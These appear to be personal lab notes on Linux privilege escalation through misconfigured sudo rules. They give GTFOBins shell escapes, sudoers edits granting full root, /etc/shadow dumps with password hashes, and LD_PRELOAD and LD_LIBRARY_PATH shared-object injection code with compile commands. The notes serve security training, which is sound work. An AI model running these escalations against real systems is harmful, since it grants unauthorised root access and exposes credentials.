
# `Privilege Escalation by SUDO (Shell Escaping)` - using binaries we can use with sudo

# `Privilege Escalation by SUDO (Shared object Injection through env variable `LD_PRELOAD` and `LD_LIBRARY_PATH`  )`

*************************************************************************************
# In this lab we will be focused on identifying misconfigured SUDO permissions

# First lets find out what the user student can actully do or allowed to do with SUDO 

student@attackdefense:~$ `sudo -l`
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/bin/man


# This means student user can run /usr/bin/man binary as root user without providing password for root user as `NOPASSWD` has been set, this is bypassing entire concept of permisions

# On a linux system admins may provide such kind of permissions for some binaries, like for example the man utility used just to veiew info so admin might thingk there is no problem with it to be access without password 

`So now user does sudo xyz command (in this case man), without password he can execute it`

student@attackdefense:~$ `sudo man ls`
LS(1)                                                                                                       User Commands                                                                                                       LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List information about the FILEs (the current directory by default).  Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.

       Mandatory arguments to long options are mandatory for short options too.

       -a, --all
              do not ignore entries starting with .

       -A, --almost-all
              do not list implied . and ..

       --author
              with -l, print the author of each file

       -b, --escape
              print C-style escapes for nongraphic characters

       --block-size=SIZE
              scale sizes by SIZE before printing them; e.g., '--block-size=M' prints sizes in units of 1,048,576 bytes; see SIZE format below

       -B, --ignore-backups
              do not list implied entries ending with ~

       -c     with -lt: sort by, and show, ctime (time of last modification of file status information); with -l: show ctime and sort by name; otherwise: sort by ctime, newest first

       -C     list entries by columns

       --color[=WHEN]
              colorize the output; WHEN can be 'always' (default if omitted), 'auto', or 'never'; more info below

       -d, --directory
              list directories themselves, not their contents

       -D, --dired
              generate output designed for Emacs' dired mode

`!/bin/bash`
root@attackdefense:~# `id`
uid=0(root) gid=0(root) groups=0(root)
root@attackdefense:~#

# But since this command is executing as root, and if we try run bash by `!/bin/bash` we can elevate our privileges to root

************************************************************************************

# Consider another lab in this we are given SSH creentials for low-privileged user, we consider that we alreay have initial-acesss

Username: karen
Password: Password1

┌──(kali㉿kali)-[~]
└─$ `ssh karen@10.10.86.143`
karen@10.10.86.143's password: 

`$ /bin/bash`
karen@ip-10-10-86-143:/$ `sudo -l`
Matching Defaults entries for karen on ip-10-10-86-143:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-86-143:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
karen@ip-10-10-86-143:/$ 


# We see that user can use find, less and nano without providing password, I dont know about the less command but one thing which comes to my mind is is that since I can nano any file so I can access `/etc/sudoers` and edit it wihtout providing password 

# lets nano /etc/sudoers and check persmissions for user karen

karen@ip-10-10-86-143:/$ `sudo nano /etc/sudoers`
       GNU nano 4.8                                                                                                   /etc/sudoers                                                                                                    Modified  
       #
       # This file MUST be edited with the 'visudo' command as root.
       #
       # Please consider adding local content in /etc/sudoers.d/ instead of
       # directly modifying this file.
       #
       # See the man page for details on how to write a sudoers file.
       #
       Defaults        env_reset
       Defaults        mail_badpass
       Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

       # Host alias specification

       # User alias specification

       # Cmnd alias specification

       # User privilege specification
       root    ALL=(ALL:ALL) ALL

       # Members of the admin group may gain root privileges
       %admin ALL=(ALL) ALL

       # Allow members of group sudo to execute any command
       %sudo   ALL=(ALL:ALL) ALL

       # See sudoers(5) for more information on "#include" directives:

       #includedir /etc/sudoers.d
       karen ALL=(ALL) NOPASSWD:/usr/bin/find
       karen ALL=(ALL) NOPASSWD:/usr/bin/less
       karen ALL=(ALL) NOPASSWD:/usr/bin/nano


# Now lets try to switch user

karen@ip-10-10-86-143:/$ `sudo su`
[sudo] password for karen: 
Sorry, user karen is not allowed to execute '/usr/bin/su' as root on ip-10-10-86-143.eu-west-1.compute.internal.
karen@ip-10-10-86-143:/$ 

# Seems like we need to add one more line to allow to execute ie `/usr/bin/su ` in the permissions

karen@ip-10-10-86-143:/$ `sudo nano /etc/sudoers`
       GNU nano 4.8                                                                                                   /etc/sudoers                                                                                                    Modified  
       #
       # This file MUST be edited with the 'visudo' command as root.
       #
       # Please consider adding local content in /etc/sudoers.d/ instead of
       # directly modifying this file.
       #
       # See the man page for details on how to write a sudoers file.
       #
       Defaults        env_reset
       Defaults        mail_badpass
       Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

       # Host alias specification

       # User alias specification

       # Cmnd alias specification

       # User privilege specification
       root    ALL=(ALL:ALL) ALL

       # Members of the admin group may gain root privileges
       %admin ALL=(ALL) ALL

       # Allow members of group sudo to execute any command
       %sudo   ALL=(ALL:ALL) ALL

       # See sudoers(5) for more information on "#include" directives:

       #includedir /etc/sudoers.d
       karen ALL=(ALL) NOPASSWD:/usr/bin/find
       karen ALL=(ALL) NOPASSWD:/usr/bin/less
       karen ALL=(ALL) NOPASSWD:/usr/bin/nano
       karen ALL=(ALL) NOPASSWD:/usr/bin/su

# Now lets try to switch user again, and BOOM! we have root access

karen@ip-10-10-86-143:/$ `sudo su`
root@ip-10-10-86-143:/# `id`
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-86-143:/# 



# NOTE 
In `PE_by_exploiting_Misconfiguration_Cron_Jobs.md` we saw that if we add permission `student ALL=NOPASSWD:ALL` in sudoers file then user should be able to have all permissions without providing password, lets try to add just `karen ALL=NOPASSWD:ALL` in this case and remove all other 

Addin this should allow karen to everything which root can do by using sudo, lets see..

karen@ip-10-10-232-16:/$ `sudo nano /etc/sudoers`
       GNU nano 4.8                                                                                                   /etc/sudoers                                                                                                    Modified  
       #
       # This file MUST be edited with the 'visudo' command as root.
       #
       # Please consider adding local content in /etc/sudoers.d/ instead of
       # directly modifying this file.
       #
       # See the man page for details on how to write a sudoers file.
       #
       Defaults        env_reset
       Defaults        mail_badpass
       Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

       # Host alias specification

       # User alias specification

       # Cmnd alias specification

       # User privilege specification
       root    ALL=(ALL:ALL) ALL

       # Members of the admin group may gain root privileges
       %admin ALL=(ALL) ALL

       # Allow members of group sudo to execute any command
       %sudo   ALL=(ALL:ALL) ALL

       # See sudoers(5) for more information on "#include" directives:

       #includedir /etc/sudoers.d
       karen ALL=NOPASSWD:ALL

# Noe lets switch user , and yes we got the Root!

karen@ip-10-10-232-16:/$ sudo su
root@ip-10-10-232-16:/# id
uid=0(root) gid=0(root) groups=0(root)

# We should also be able to see sensitive files which only root user can, let see, and yes we can

root@ip-10-10-232-16:/# `su karen`
`$ /bin/bash -i `                               
karen@ip-10-10-232-16:/$ `sudo cat /etc/shadow`
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
karen@ip-10-10-232-16:/$ 

***************************************************************

# We can also utilise `GTFOBins` for the programs we can access using sudo like
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

# If we search `GTFOBins` for nano and if see Sudo section
https://gtfobins.github.io/gtfobins/nano/

       Sudo

       If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

       sudo nano
       ^R^X
       reset; sh 1>&0 2>&0

# lets follow these command, lets first nano to any test file

# After entrting any data when we do `Ctrl+R then Ctrl+X,` it gives us ascreen below as comand to execute we can write

Command to execute: reset; `sh 1>&0 2>&0`

# when we enter it starts executing, and in the same window if we type id we get the root access

 [ Executing... ]# `id`
uid=0(root) gid=0(root) groups=0(root) 


**************************************************************************************************************
# Below is lab example of how other binaries like `find`, `awk`, `vim` can gain us root access, We can use GTFOBins for more (we already saw for `man`,`nano`, and `base64`)

TCM@debian:/tmp$ `sudo -l`
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

TCM@debian:/tmp$ `sudo find . -exec /bin/sh \; -quit`
sh-4.1# `id`
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# `su TCM`

TCM@debian:/tmp$ `sudo awk 'BEGIN {system("/bin/sh")}'`
sh-4.1# `id`
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# `su TCM`

TCM@debian:/tmp$ `sudo vim -c '!sh'`
sh-4.1# `id`
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# `su TCM`

TCM@debian:/tmp$ `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
Starting Nmap 5.00 ( http://nmap.org ) at 2024-01-28 04:52 EST
sh-4.1# `id`
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# `su TCM`

TCM@debian:/tmp$ `sudo apache2 -f /etc/shadow`
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration

**************************************************************************************************************

# `Privilege Escalation by /etc/sudoers Environment Variables`

# `Privilege Escalation by Shared object Injection through env variable `LD_PRELOAD` and `LD_LIBRARY_PATH` `

# we consider that we alreay have initial-acesss 

# /etc/sudoers Environment Variables

By default, only specific environment variables are left unchanged while invoking a command through sudo. These include TERM, `PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME, and SUDO_* variables` as noted in the sudoers manual. This is due to the env_reset setting being enabled by default.

In order to preserve additional environment variables through sudo calls, variables can be added to `env_keep`. `All variables that are included in env_keep will remain unchanged`. If the `LD_PRELOAD` or `LD_LIBRARY_PATH` environment variable is added to `env_keep `then a user can specify shared libraries to load before the program is executed through sudo. This is dangerous and can lead to privilege escalation.

# The Exploit

If you’re looking to find a privilege escalation method and the output of sudo -l shows that LD_PRELOAD is added to env_keep as shown below, you are in luck!

# Prerequisite to escalate privileges by `SUDO - Envirnment Variables`

- There should be `env_keep` variable set to LD_Preload or LD_LIBRARY_PATH
- You should have atleast access to wirite and compile your own code to genrate a elf binary with same name as one used by the binary you are provided with sudo privilegs

***************************************************************************************************************

# Lets check binaries that we can access using sudo without providing password

┌──(user㉿kali)-[/home/kali]
└─$ `sudo -l`
Matching Defaults entries for user on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty

User user may run the following commands on kali:
    (ALL) NOPASSWD: /usr/bin/nano
    (ALL) NOPASSWD: /usr/bin/ls
    (ALL) NOPASSWD: /usr/bin/find

# We can see we can run /usr/share/bin without providing password

# lets check shared libraries /dynamically linked program /shared object used by binary /usr/bin/nano

┌──(user㉿kali)-[/home/kali]
└─$ `ldd /usr/bin/nano`
        linux-vdso.so.1 (0x00007ffd39f7d000)
        libncursesw.so.6 => /lib/x86_64-linux-gnu/libncursesw.so.6 (0x00007fb1a3d37000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fb1a3d05000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb1a3b24000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb1a3b1f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb1a3de2000)

# We can now write our malicious code and name it same as any of the dynamicllay linked/ shared library used by nano 

# Lets write below code in a file exploit.c

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init(){
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}

or 

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	}

└─$ `cat exploit.c ` 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init(){
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
    
# Now lets compile this c code and name the output binary as libncursesw.so.6 (we can use any) 

└─$ `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c`

./exploit.c: In function ‘_init’:
./exploit.c:6:5: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
    6 |     setresuid(0,0,0);
      |     ^~~~~~~~~
                           

└─$ `ls`
exploit.c  libncursesw.so.6

# Now lets preload this binary created by us using env variable `LD_PRELOAD` which is there in sudo variable `env_keep`

# And we get root access!!

┌──(user㉿kali)-[/home/kali]
└─$ `sudo LD_PRELOAD=./libncursesw.so.6 nano`
┌──(root㉿kali)-[/home/kali]
└─# `id  ` 
uid=0(root) gid=0(root) groups=0(root)



# NOTE - to show this lab was not working, to show this I have created a user named user,  Addedd `env_keep+=LD_PRELOAD` in Defaults in /etc/sudoers, also added `user ALL=(ALL) NOPASSWD:/usr/bin/nano, user ALL=(ALL) NOPASSWD:/usr/bin/ls, user ALL=(ALL) NOPASSWD:/usr/bin/find`

       This file MUST be edited with the 'visudo' command as root.
       #
       # Please consider adding local content in /etc/sudoers.d/ instead of
       # directly modifying this file.
       #
       # See the man page for details on how to write a sudoers file.
       #
       Defaults        env_reset
       Defaults        mail_badpass
       Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
       Defaults        env_keep+=LD_PRELOAD
       # This fixes CVE-2005-4890 and possibly breaks some versions of kdesu
       # (#1011624, https://bugs.kde.org/show_bug.cgi?id=452532)
       Defaults        use_pty

       # This preserves proxy settings from user environments of root
       # equivalent users (group sudo)
       #Defaults:%sudo env_keep += "http_proxy https_proxy ftp_proxy all_proxy no_proxy"

       # This allows running arbitrary commands, but so does ALL, and it means
       # different sudoers have their choice of editor respected.
       #Defaults:%sudo env_keep += "EDITOR"

       # Completely harmless preservation of a user preference.
       #Defaults:%sudo env_keep += "GREP_COLOR"

       # While you shouldn't normally run git as root, you need to with etckeeper
       #Defaults:%sudo env_keep += "GIT_AUTHOR_* GIT_COMMITTER_*"

       # Per-user preferences; root won't have sensible values for them.
       #Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"

       # "sudo scp" or "sudo rsync" should be able to use your SSH agent.
       #Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"

       # Ditto for GPG agent
       #Defaults:%sudo env_keep += "GPG_AGENT_INFO"

       # Host alias specification

       # User alias specification

       # Cmnd alias specification

       # User privilege specification
       root    ALL=(ALL:ALL) ALL

       # Allow members of group sudo to execute any command
       %sudo   ALL=(ALL:ALL) ALL

       # See sudoers(5) for more information on "@include" directives:

       @includedir /etc/sudoers.d
       user ALL=(ALL) NOPASSWD:/usr/bin/nano
       user ALL=(ALL) NOPASSWD:/usr/bin/ls

# `env_keep`
In order to preserve additional environment variables through sudo calls, variables can be added to `env_keep`. `All variables that are included in env_keep will remain unchanged`. If the `LD_PRELOAD` environment variable is added to `env_keep `then a `user can specify shared libraries to load before the program is executed through sudo`. This is dangerous and can lead to privilege escalation.

# `LD_PRELOAD`
`If you’re looking to find a privilege escalation method and the output of sudo -l shows that LD_PRELOAD is added to env_keep as shown below, you are in luck! `

************************************************************************************************
# Consider another lab, 

user@debian:~$ `sudo -l`
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

user@debian:~$ `ldd /usr/sbin/apache2`
        linux-vdso.so.1 =>  (0x00007fff025ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fa80f5e3000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fa80f3bf000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fa80f185000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fa80ef69000)
        libc.so.6 => /lib/libc.so.6 (0x00007fa80ebfd000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007fa80e9f8000)
        librt.so.1 => /lib/librt.so.1 (0x00007fa80e7f0000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fa80e5b9000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007fa80e3b4000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fa80e18c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa80faa0000)
user@debian:~$ 

# Write code and compile it and use it with `LD_PRELOAD`

user@debian:~$ `cat /tmp/preload.c`
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
user@debian:~$ `gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c`
user@debian:~$ `sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2`
root@debian:/home/user# `whoami`
root
root@debian:/home/user# 

# Similary we can use `LD_LIBRARY_PATH`

user@debian:~$ `ldd /usr/sbin/apache2`
        linux-vdso.so.1 =>  (0x00007fffed1e8000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fd451d1d000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fd451af9000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fd4518bf000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fd4516a3000)
        libc.so.6 => /lib/libc.so.6 (0x00007fd451337000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007fd451132000)
        librt.so.1 => /lib/librt.so.1 (0x00007fd450f2a000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fd450cf3000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007fd450aee000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fd4508c6000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd4521da000)

user@debian:~$ `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

user@debian:~$ `sudo LD_LIBRARY_PATH=/tmp apache2`
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/home/user# `whoami`
root
root@debian:/home/user# 


************************************************************************************************

# `NOTE` that we dont need to name our binary same as one of the existing shared library, it will include and load our created library in any case for example below we loaded `mybinary` in apache2 as shared library

TCM@debian:/tmp$ `sudo -l`
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more


TCM@debian:/tmp$ `nano x.c`
TCM@debian:/tmp$ `gcc -fPIC -shared -o /tmp/mybinary.so x.c -nostartfiles`
TCM@debian:/tmp$ `sudo LD_PRELOAD=/tmp/mybinary.so apache2`
root@debian:/tmp# `id`
uid=0(root) gid=0(root) groups=0(root)
root@debian:/tmp# 
